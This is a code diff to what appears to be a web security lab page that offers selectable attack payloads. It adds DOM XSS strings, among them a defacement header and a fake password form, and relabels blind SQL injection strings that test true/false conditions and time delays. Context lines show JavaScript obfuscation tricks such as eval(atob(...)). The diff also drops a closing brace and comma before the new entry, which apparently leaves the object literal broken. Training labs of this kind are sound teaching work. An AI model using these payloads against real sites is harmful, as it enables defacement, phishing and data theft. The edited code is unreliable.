@@ -124,6 +124,8 @@
                     <option value="/sqli">💉 SQL INJECTION</option>
                     <option value="/stealth">🛡️ EVASION LAB</option>
 		    <option value="/advanced">🧪 ADVANCED LAB</option>
+		    <option value="/sensitive">📂 SENSITIVE DATA</option>
+		    <option value="/dom">⚡ DOM XSS LAB</option>
                 </select>
                 <button class="btn btn-purple btn-full" onclick="openTool()">GO TO PAGE</button>
             </div>
@@ -195,15 +197,22 @@
                      "JJEncode": "$=~[];$={___:++$,$$$$:(![]+\"\")[$]};",
                      "Base64 Exec": "eval(atob('YWxlcnQoMSk='))"
                  }
-            },
-	    '/advanced': {
-                "title": "🧪 ADVANCED PAYLOADS",
+            '/dom': {
+                "title": "⚡ DOM XSS PAYLOADS",
                 "data": {
-                    "DOM XSS (Image)": "#<img src=x onerror=alert(1)>",
-                    "DOM XSS (Body)": "#<body onload=alert(1)>",
+                    "1. Image Alert": "#<img src=x onerror=alert(1)>",
+                    "2. Body OnLoad": "#<body onload=alert(1)>",
+                    "3. Defacement": "#<h1 style='color:red'>HACKED</h1>",
+                    "4. Mouse Trap": "#<button onmouseover=alert(1)>HOVER ME</button>",
+                    "5. Phishing Form": "#<form><input type='password' placeholder='Password'></form>"
+                }
+            },
+            '/advanced': {
+                "title": "🧪 BLIND SQL PAYLOADS",
+                "data": {
                     "Blind SQL (True)": "admin' AND 1=1 --",
                     "Blind SQL (False)": "admin' AND 1=2 --",
-                    "Blind Time-Based (Sleep)": "admin' AND randomblob(100000000) --" 
+                    "Blind Time-Based": "admin' AND randomblob(100000000) --" 
                 }
             }
         };
